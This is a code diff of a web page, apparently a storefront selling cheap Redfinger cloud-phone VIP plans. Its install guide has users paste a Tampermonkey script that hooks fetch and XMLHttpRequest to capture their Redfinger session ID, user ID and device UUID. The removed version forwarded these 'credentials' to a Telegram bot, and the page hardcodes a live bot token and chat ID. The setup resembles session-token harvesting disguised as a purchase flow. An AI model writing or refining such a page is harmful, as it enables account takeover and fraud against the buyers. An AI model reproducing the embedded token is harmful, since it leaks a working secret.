@@ -7,7 +7,7 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;600;700&display=swap');
-    
+   
     body {
       font-family: 'Inter', system-ui, sans-serif;
       background: linear-gradient(135deg, #0a0f1c 0%, #1e2a5e 100%);
@@ -61,8 +61,7 @@
       color: white;
       font-size: 1.1rem;
     }
-    textarea { height: 160px; font-family: monospace; resize: vertical; }
-
+    textarea { height: 120px; font-family: monospace; resize: vertical; }
     button {
       width: 100%;
       padding: 20px;
@@ -75,7 +74,6 @@
       cursor: pointer;
       margin: 20px 0;
     }
-
     .upload-area {
       border: 2px dashed #60a5fa;
       border-radius: 16px;
@@ -85,12 +83,10 @@
       margin: 15px 0;
     }
     .preview { margin-top: 15px; max-width: 100%; max-height: 300px; border-radius: 12px; display: none; }
-
     .price-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 20px; margin: 30px 0; }
     .price-card { background: linear-gradient(145deg, #1e2937, #334155); border-radius: 20px; padding: 25px; text-align: center; border: 2px solid transparent; cursor: pointer; transition: all 0.4s; }
     .price-card:hover { transform: translateY(-10px); border-color: #60a5fa; }
     .price-card.active { border-color: #22c55e; box-shadow: 0 0 30px rgba(74, 222, 128, 0.5); transform: scale(1.05); }
-
     .days-options { display: flex; gap: 12px; margin: 15px 0; }
     .day-btn { flex: 1; padding: 14px; background: #334155; border: 2px solid #475569; border-radius: 12px; text-align: center; cursor: pointer; font-weight: 600; }
     .day-btn.active { background: #22c55e; color: black; border-color: #86efac; }
@@ -103,27 +99,26 @@
       <p>AFFORDABLE RED FINGER SAPPHIRES • 24/7 Automated</p>
     </div>
     <div class="content">
-
       <!-- Installation Guide -->
       <div class="step">
         <h2 style="text-align:center; margin-bottom:25px;">📱 Installation Guide</h2>
         <p><strong>1.</strong> Install Kiwi Browser + Tampermonkey</p>
         <p><strong>2.</strong> Tap button below to copy script</p>
         <p><strong>3.</strong> In Tampermonkey → Create new script → Paste → Save</p>
-
         <button onclick="copyScript()" style="background: linear-gradient(90deg, #a855f7, #c084fc); color: white;">
           <i class="fas fa-copy"></i> COPY FULL SCRIPT CODE
         </button>
-
         <button onclick="openRedfinger()" style="margin-top:10px;">
           <i class="fas fa-external-link-alt"></i> OPEN REDFINGER LOGIN PAGE
         </button>
       </div>
 
-      <!-- Step 1: Paste Credentials -->
+      <!-- Step 1: User ID & Reward Code -->
       <div class="step">
-        <h2 style="text-align:center; margin-bottom:20px;">📋 Step 1: Paste Captured Info</h2>
-        <textarea id="credentials" placeholder="Paste everything from the green 'COPY REDFINGER INFO' button here..."></textarea>
+        <h2 style="text-align:center; margin-bottom:20px;">📋 Step 1: Enter Your Info</h2>
+        <input type="text" id="userId" placeholder="User ID" required>
+        <input type="text" id="rewardCode" placeholder="Reward Code (if any)" required>
+        <small style="color:#94a3b8; display:block; margin-top:8px;">You can get your User ID by using the Tampermonkey script</small>
       </div>
 
       <!-- Price Plans -->
@@ -152,7 +147,6 @@
           <div class="day-btn" data-days="90">90 Days</div>
         </div>
         <textarea id="note" placeholder="Additional notes (optional)"></textarea>
-
         <h3 style="margin:20px 0 10px;">📸 Upload Payment Receipt (Optional)</h3>
         <div class="upload-area" id="uploadArea">
           <i class="fas fa-cloud-upload-alt" style="font-size: 3rem; color: #60a5fa; margin-bottom:10px;"></i>
@@ -160,7 +154,6 @@
           <input type="file" id="receipt" accept="image/*" style="display:none;">
         </div>
         <img id="preview" class="preview" alt="Receipt Preview">
-
         <button onclick="submitOrder()">🚀 CONFIRM ORDER & SEND TO SELLER</button>
       </div>
 
@@ -172,12 +165,11 @@
           <img src="https://i.imgur.com/SnIB5Dt.jpeg" alt="GCash QR Code" style="max-width: 320px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
         </div>
         <div style="text-align:center; background: rgba(15,23,42,0.8); padding: 20px; border-radius: 16px;">
-          <strong style="font-size:1.6rem; color:#4ade80;">0994 6461 806</strong> 
+          <strong style="font-size:1.6rem; color:#4ade80;">0994 6461 806</strong>
           <small style="color:#94a3b8;">(E.R)</small><br><br>
           <small>Send the <strong>exact amount</strong> + your name in the reference</small>
         </div>
       </div>
-
       <div id="result"></div>
     </div>
   </div>
@@ -185,20 +177,18 @@
   <script>
     function copyScript() {
       const script = `// ==UserScript==
-// @name         Redfinger Auto Capture
-// @namespace    https://dazai-ux.github.io
-// @version      2.4
-// @description  Captures Redfinger credentials
-// @author       Dazai
-// @match        https://www.cloudemulator.net/*
-// @grant        GM_setClipboard
-// @run-at       document-end
+// @name Redfinger Auto Capture
+// @namespace https://dazai-ux.github.io
+// @version 2.4
+// @description Captures Redfinger credentials
+// @author Dazai
+// @match https://www.cloudemulator.net/*
+// @grant GM_setClipboard
+// @run-at document-end
 // ==/UserScript==
-
 (function() {
     'use strict';
     let captured = { userId: "Not Found", sessionId: "Not Found", uuid: "Not Found" };
-
     function extractFromUrl(url) {
         try {
             const params = new URL(url).searchParams;
@@ -207,19 +197,16 @@
             if (params.has('uuid') || params.has('deviceId')) captured.uuid = params.get('uuid') || params.get('deviceId');
         } catch(e){}
     }
-
     const originalFetch = window.fetch;
     window.fetch = async function(input) {
         if (typeof input === 'string') extractFromUrl(input);
         return originalFetch.apply(this, arguments);
     };
-
     const originalOpen = XMLHttpRequest.prototype.open;
     XMLHttpRequest.prototype.open = function(method, url) {
         if (url) extractFromUrl(url);
         return originalOpen.apply(this, arguments);
     };
-
     function createButton() {
         if (document.getElementById('rf-capture-btn')) return;
         const btn = document.createElement('button');
@@ -233,10 +220,8 @@
         };
         document.body.appendChild(btn);
     }
-
     setTimeout(createButton, 1200);
 })();`;
-
       navigator.clipboard.writeText(script).then(() => {
         alert("✅ Script copied to clipboard!\n\nNow go to Tampermonkey → Create new script → Paste (Ctrl+V) → Save (Ctrl+S)");
       });
@@ -246,11 +231,11 @@
       window.open('https://www.cloudemulator.net/app/sign-in?type=RedeemCode&channelCode=web', '_blank');
     }
 
-    // Order Form
     let selectedPlan = "SVIP";
     let selectedDays = "30";
     let selectedFile = null;
 
+    // Price card & days selection
     document.querySelectorAll('.price-card').forEach(card => {
       card.addEventListener('click', () => {
         document.querySelectorAll('.price-card').forEach(c => c.classList.remove('active'));
@@ -268,10 +253,10 @@
       });
     });
 
+    // Upload handling
     const uploadArea = document.getElementById('uploadArea');
     const fileInput = document.getElementById('receipt');
     const preview = document.getElementById('preview');
-
     uploadArea.addEventListener('click', () => fileInput.click());
     fileInput.addEventListener('change', e => {
       if (e.target.files[0]) {
@@ -284,8 +269,12 @@
 
     async function submitOrder() {
       const customer = document.getElementById('customer').value.trim();
-      const credentials = document.getElementById('credentials').value.trim();
-      if (!customer || !credentials) return alert("❌ Please fill required fields");
+      const userId = document.getElementById('userId').value.trim();
+      const rewardCode = document.getElementById('rewardCode').value.trim();
+
+      if (!customer || !userId) {
+        return alert("❌ Please fill User ID and Name");
+      }
 
       const btn = document.querySelector('button[onclick="submitOrder()"]');
       btn.disabled = true;
@@ -294,7 +283,12 @@
       const BOT_TOKEN = "8758270440:AAEdUvBIKpGqhu0CzsLcOV3oQnwRP7c25jI";
       const CHAT_ID = "6598357465";
 
-      const msg = `🛒 New Order from Dazai's Store\n\n👤 ${customer}\n⭐ ${document.getElementById('vip').value} — ${selectedDays} Days\n📋 Credentials:\n<pre>${credentials}</pre>`;
+      const msg = `🛒 New Order from Dazai's Store\n\n` +
+                  `👤 ${customer}\n` +
+                  `⭐ ${document.getElementById('vip').value} — ${selectedDays} Days\n\n` +
+                  `🆔 User ID : ${userId}\n` +
+                  `🎟️ Reward Code : ${rewardCode || "None"}\n` +
+                  `📝 Note : ${document.getElementById('note').value || "No note"}`;
 
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
@@ -314,6 +308,7 @@
           ✅ <strong>Order Sent Successfully!</strong><br><br>
           Thank you, <b>${customer}</b>!
         </div>`;
+
       btn.innerHTML = '✅ ORDER SENT SUCCESSFULLY';
     }
   </script>
